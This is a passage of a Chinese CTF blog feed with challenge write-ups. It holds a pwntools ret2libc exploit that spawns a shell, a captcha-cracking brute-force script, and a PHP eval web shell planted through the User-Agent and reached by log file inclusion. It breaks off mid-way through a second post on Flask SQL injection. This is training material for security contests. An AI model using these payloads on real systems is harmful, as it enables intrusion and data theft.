title="听说你们喜欢手工爆破（solved）"></a>听说你们喜欢手工爆破（solved）</h3><p>flag{}内英文字母为大写形式<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/OS_038c9291c8039792d1aad140f6664671.iso?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/OS_038c9291c8039792d1aad140f6664671.iso?pass=null</a><br>根据提示，应该是曼彻斯特码，不过本题的编码不是标准编码，需要脑洞<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">a = <span class="string">'123654AAA678876303555111AAA77611A321'</span></span><br><span class="line"><span class="comment"># 她现在住在F5街区F5街道07号幢</span></span><br><span class="line">f =  <span class="string">'0'</span>+bin(int(<span class="string">'0x'</span>+a,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> f,len(f)</span><br><span class="line"></span><br><span class="line">f2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">142</span>,<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> f[i:i+<span class="number">2</span>] == <span class="string">'01'</span>:</span><br><span class="line">f2 += <span class="string">'0'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">f2 += <span class="string">'1'</span></span><br><span class="line"><span class="keyword">print</span> f2,len(f2)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">71</span>,<span class="number">8</span>):</span><br><span class="line">tmp = f2[i:i+<span class="number">8</span>][::<span class="number">-1</span>]</span><br><span class="line">flag += hex(int(tmp[:<span class="number">4</span>],<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">flag += hex(int(tmp[<span class="number">4</span>:],<span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> flag.upper()</span><br></pre></td></tr></table></figure></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="game-server（solved）"><a href="#game-server（solved）" class="headerlink" title="game server（solved）"></a>game server（solved）</h3><p>nc 123.59.138.180 20000<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/game_server_ccc0d7c007817105ab5b9d10c6f1c8b1.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/game_server_ccc0d7c007817105ab5b9d10c6f1c8b1.zip?pass=null</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_8048637</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+7h] [ebp-111h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+107h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+108h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to my game server"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"First, you need to tell me you name?"</span>);</span><br><span class="line">  fgets(byte_804A180, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v4 = <span class="built_in">strrchr</span>(byte_804A180, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    *v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, byte_804A180);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What's you occupation?"</span>);</span><br><span class="line">  fgets(byte_804A080, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v4 = <span class="built_in">strrchr</span>(byte_804A080, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    *v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Well, my noble %s\n"</span>, byte_804A080);</span><br><span class="line">  nbytes = <span class="built_in">snprintf</span>(</span><br><span class="line">             &amp;s,</span><br><span class="line">             <span class="number">0x100</span>u,</span><br><span class="line">             <span class="string">"Our %s is a noble %s. He is come from north and well change out would."</span>,</span><br><span class="line">             byte_804A180,</span><br><span class="line">             byte_804A080);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is you introduce"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself?[Y/N]"</span>);</span><br><span class="line">  v2 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">89</span> )</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, nbytes);         <span class="comment">//此处存在栈溢出</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"name : %s\noccupation : %s\nintroduce : %s\n"</span>, byte_804A180, byte_804A080, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后修改<code>introduce</code>的地方存在明显栈溢出，程序只开了NX，直接利用<code>puts</code>进行泄露函数地址，然后查找对应的libc，计算<code>system</code>偏移getshell<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>) </span><br><span class="line">LOCAL = <span class="number">0</span></span><br><span class="line">remote_addr = <span class="string">'123.59.138.180'</span></span><br><span class="line">remote_port = <span class="number">20000</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    p = process(<span class="string">'./pwn2'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(remote_addr,remote_port)</span><br><span class="line">    libc = ELF(<span class="string">'./libc6-i386_2.23-0ubuntu10_amd64.so'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(payload)</span>:</span></span><br><span class="line">    name = <span class="number">255</span>*<span class="string">'A'</span></span><br><span class="line">    p.sendafter(<span class="string">'name?\n'</span>,name)</span><br><span class="line">    noble = <span class="string">'1'</span>*<span class="number">255</span></span><br><span class="line">    p.sendafter(<span class="string">'occupation?\n'</span>,noble)</span><br><span class="line">    p.sendlineafter(<span class="string">'[Y/N]\n'</span>,<span class="string">'Y'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">put = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">junk = <span class="number">277</span>*<span class="string">'A'</span></span><br><span class="line">payload =junk +  p32(put) + p32(<span class="number">0x08048637</span>) + p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">foo(payload)</span><br><span class="line">p_addr =u32(p.recvuntil(<span class="string">'\xf7'</span>)[<span class="number">-4</span>:])</span><br><span class="line">success(hex(p_addr))</span><br><span class="line">libc.address = p_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">success(hex(libc.address))</span><br><span class="line">success(hex(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">payload2 = junk + p32(libc.symbols[<span class="string">'system'</span>]) + p32(<span class="number">0</span>) + p32(next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line">foo(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="Shellcode-Manager"><a href="#Shellcode-Manager" class="headerlink" title="Shellcode Manager"></a>Shellcode Manager</h3><p>nc 123.59.138.180 13579<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/shellcode_manager_0cb5a25a8f7fd4d3b5a12b0bb19d8834.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/shellcode_manager_0cb5a25a8f7fd4d3b5a12b0bb19d8834.zip?pass=null</a></p><h3 id="Starcraft-RPG"><a href="#Starcraft-RPG" class="headerlink" title="Starcraft RPG"></a>Starcraft RPG</h3><p>nc 123.59.138.180 13799<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/starcraft_rpg_507f28c1a20762caf02ffc693f6978eb.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/starcraft_rpg_507f28c1a20762caf02ffc693f6978eb.zip?pass=null</a></p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="icm（solved）"><a href="#icm（solved）" class="headerlink" title="icm（solved）"></a>icm（solved）</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/icm_49785d49972274eac2273fb2bc3a5704.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/icm_49785d49972274eac2273fb2bc3a5704.zip?pass=null</a></p><h3 id="wcm（solved）"><a href="#wcm（solved）" class="headerlink" title="wcm（solved）"></a>wcm（solved）</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/wcm_d46106eb128a18a826d1faab3cf60571.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/wcm_d46106eb128a18a826d1faab3cf60571.zip?pass=null</a></p><h3 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/explain_bbb5702a489a0c0eaac68e6a6fd7329b.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/explain_bbb5702a489a0c0eaac68e6a6fd7329b.zip?pass=null</a></p><h3 id="ccm"><a href="#ccm" class="headerlink" title="ccm"></a>ccm</h3><p><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/ccm_74cf0e74e3b38a20fefb73d81eb5f0b8.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/ccm_74cf0e74e3b38a20fefb73d81eb5f0b8.zip?pass=null</a></p><h2 id="crypt"><a href="#crypt" class="headerlink" title="crypt"></a>crypt</h2><h3 id="3dlight"><a href="#3dlight" class="headerlink" title="3dlight"></a>3dlight</h3><p>nc 123.59.138.211 20000<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/3dlight_8fe7455b6f72d04629763acf7a793b59.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/3dlight_8fe7455b6f72d04629763acf7a793b59.zip?pass=null</a></p><h3 id="rsa-system"><a href="#rsa-system" class="headerlink" title="rsa system"></a>rsa system</h3><p>nc 123.59.138.211 23333<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/rsa_system_89ab28deea7b30d99a949f2220aac31b.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/rsa_system_89ab28deea7b30d99a949f2220aac31b.zip?pass=null</a></p><h3 id="advanced-ecc"><a href="#advanced-ecc" class="headerlink" title="advanced ecc"></a>advanced ecc</h3><p>nc 123.59.138.211 34545<br><a href="http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/advanced_ecc_a48db2b810bb655bf9e4992894cdbf06.zip?pass=null" target="_blank" rel="noopener">http://static2.ichunqiu.com/icq/resources/fileupload/CTF/echunqiu/redhat/advanced_ecc_a48db2b810bb655bf9e4992894cdbf06.zip?pass=null</a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="simple-upload（solved）"><a href="#simple-upload（solved）" class="headerlink" title="simple upload（solved）"></a>simple upload（solved）</h3><p>这次在你面前的网站的功能非常简单，接受挑战吧！<br>直接传jsp小马getshell</p><h3 id="shopping-log（solved）"><a href="#shopping-log（solved）" class="headerlink" title="shopping log（solved）"></a>shopping log（solved）</h3><p><a href="http://123.59.141.153/" target="_blank" rel="noopener">http://123.59.141.153/</a><br>或者 <a href="http://120.132.95.234/" target="_blank" rel="noopener">http://120.132.95.234/</a><br>首先需要修改系统<code>hosts</code>文件，然后绕过<code>http header</code>各种限制，最后进入一个订单查询系统，根据提示，直接从<code>9999</code>开始往下爆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(x)</span>:</span></span><br><span class="line"><span class="keyword">return</span> hashlib.md5(x).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcode</span><span class="params">(mdcode)</span>:</span></span><br><span class="line">s3=<span class="string">'qwertyuiopasdfghjklzxcvbnm1234567890'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> s3:</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> s3:</span><br><span class="line">s=i+j+m+n+a</span><br><span class="line"><span class="keyword">if</span> md5(s)[<span class="number">0</span>:<span class="number">6</span>]==mdcode:</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.tmvb.com/5a560e50e61b552d34480017c7877467info.php'</span></span><br><span class="line">url2 = <span class="string">'http://www.tmvb.com/api.php?action=report'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '</span></span><br><span class="line"><span class="string">'Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3'</span>,<span class="string">'Connection'</span>: <span class="string">'keep-alive'</span>,</span><br><span class="line"><span class="string">'Referer'</span>:<span class="string">'www.dww.com'</span>,<span class="string">'Accept-Language'</span>: <span class="string">'ja'</span>,<span class="string">'X-Forward-For'</span>:<span class="string">'133.1.16.172'</span>,</span><br><span class="line"><span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=48ja11agl6fbo52gsntfk4feq1'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 订单编号：&lt;input type="text" id="TxtTid" placeholder="请输入订单编号后四位" style="margin-right: 30px;" /&gt;</span></span><br><span class="line"><span class="comment"># 验证码：&lt;input type="text" id="code" placeholder="code" style="width:40px;" /&gt;&lt;p&gt;substr(md5(code),0,6) === '167d9f'&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">9999</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">r = requests.get(url=url,headers=headers)</span><br><span class="line"><span class="comment">#print r.content</span></span><br><span class="line">vcode  = re.findall(<span class="string">r"=== '(.&#123;6&#125;)'"</span>,r.content)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> vcode</span><br><span class="line">vv = getcode(vcode)</span><br><span class="line"><span class="comment">#print vv , md5(vv)</span></span><br><span class="line">dat = &#123;<span class="string">'TxtTid'</span>:str(n),<span class="string">'code'</span>:vv&#125;</span><br><span class="line">r = requests.post(url=url2,headers=headers,data=dat)</span><br><span class="line"><span class="keyword">print</span> dat</span><br><span class="line"><span class="keyword">print</span> r.content</span><br><span class="line"><span class="keyword">if</span> <span class="string">'There\'s no such order'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'"error":1'</span> <span class="keyword">in</span> r.content:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="comment">#raw_input('go on~')</span></span><br><span class="line">n -= <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="guess-id"><a href="#guess-id" class="headerlink" title="guess id"></a>guess id</h3><p><a href="http://123.59.134.192/" target="_blank" rel="noopener">http://123.59.134.192/</a><br>或 <a href="http://120.132.94.238/" target="_blank" rel="noopener">http://120.132.94.238/</a><br>hint: 身份证号码是有一定规律的<br>hint2: AES256是很棒的加密算法， ECB模式很容易理解</p><h3 id="biubiubiu（solved）"><a href="#biubiubiu（solved）" class="headerlink" title="biubiubiu（solved）"></a>biubiubiu（solved）</h3><p>这次在你面前的网站看起来很复杂，接受挑战吧！<br><a href="http://ff970e071ecc41dcb5f51c0ff0b8ac273cce9a8ac0d44936.game.ichunqiu.com/index.php?page=login.php" target="_blank" rel="noopener">http://ff970e071ecc41dcb5f51c0ff0b8ac273cce9a8ac0d44936.game.ichunqiu.com/index.php?page=login.php</a><br>存在文件包含漏洞</p><p>关键代码send.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'url'</span>]) &#123;</span><br><span class="line">    $url = @$_POST[<span class="string">'url'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/^http(s?):\/\/.+/"</span>, $url))&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    curl_setopt($ch,CURLOPT_REDIR_PROTOCOLS,CURLPROTO_GOPHER|CURLPROTO_HTTP|CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>数据库信息conn.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$db_host = <span class="string">'mysql'</span>;</span><br><span class="line">$db_name = <span class="string">'user_admin'</span>;</span><br><span class="line">$db_user = <span class="string">'Dog'</span>;</span><br><span class="line">$db_pwd = <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p><p>user.sql<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`admin`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`admin`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">10</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">43</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=MyISAM AUTO_INCREMENT=<span class="number">2</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure></p><p>思路：将一句话写在<code>User-Agent</code>，然后包含nginx的access.log。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://b4249514f2884c21859174e65ddd2615d8f7f25d5a9947b1.game.ichunqiu.com/index.php --header "User-Agent:&lt;?php eval(\$_POST['1'])?&gt;"</span><br></pre></td></tr></table></figure></p><p>然后用菜刀连接<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://b4249514f2884c21859174e65ddd2615d8f7f25d5a9947b1.game.ichunqiu.com/index.php?page=../../../var/log/nginx/access.log</span><br></pre></td></tr></table></figure></p><p>flag在数据中，用菜刀自带的数据库功能读取即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h2&gt;&lt;h3 id=&quot;Not-Only-Wireshark（solved）&quot;&gt;&lt;a href=&quot;#Not-Only-Wireshark（
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Python-is-the-best-language</title>
    <link href="https://4f-kira.github.io/2018/04/16/Python-is-the-best-language/"/>
    <id>https://4f-kira.github.io/2018/04/16/Python-is-the-best-language/</id>
    <published>2018-04-16T04:57:09.000Z</published>
    <updated>2018-04-16T05:02:12.313Z</updated>
    
    <content type="html"><![CDATA[<p>本文纯属抄袭，如有改动，纯属手残。</p><p>原writeup见：</p><p><a href="http://skysec.top/2018/04/01/Python-is-the-best-language/#%E6%BA%90%E7%A0%81%E7%BB%93%E6%9E%84" target="_blank" rel="noopener">http://skysec.top/2018/04/01/Python-is-the-best-language/#%E6%BA%90%E7%A0%81%E7%BB%93%E6%9E%84</a></p><p><a href="https://xz.aliyun.com/t/2219#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2219#toc-1</a></p><p><a href="https://lorexxar.cn/2018/03/26/qwb2018/#python-is-best-language" target="_blank" rel="noopener">https://lorexxar.cn/2018/03/26/qwb2018/#python-is-best-language</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install Flask</span><br><span class="line">pip install flask_login</span><br><span class="line">pip install flask_bootstrap</span><br><span class="line">pip install flask_moment</span><br><span class="line">pip install sqlalchemy</span><br><span class="line">sudo apt-get install libmysqlclient-dev</span><br><span class="line">pip install flask_wtf</span><br><span class="line">pip install MySQL-python</span><br></pre></td></tr></table></figure><p>创建数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE `flask` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure></p><p>修改<code>config.py</code>中数据库账号密码，然后运行<code>python db_create.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">"mysql://root:密码@127.0.0.1/flask?charset=utf8"</span></span><br></pre></td></tr></table></figure></p><p>修改<code>run.py</code>后运行<code>python run.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">30003</span>)</span><br></pre></td></tr></table></figure></p><h2 id="Python-is-the-best-language1"><a href="#Python-is-the-best-language1" class="headerlink" title="Python is the best language1"></a>Python is the best language1</h2><p>第一题是sql注入，重点关注以下文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">forms.py 用于表单登录，注册等</span><br><span class="line">models.py 放置操作数据库的代码</span><br><span class="line">others.py mysql操作语句等函数</span><br><span class="line">routes.py 路由文件</span><br></pre></td></tr></table></figure></p><h3 id="注入点一"><a href="#注入点一" class="headerlink" title="注入点一"></a>注入点一</h3><p>看看<code>routes.py</code>中注册代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/register', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    form = RegistrationForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        res = mysql.Add(<span 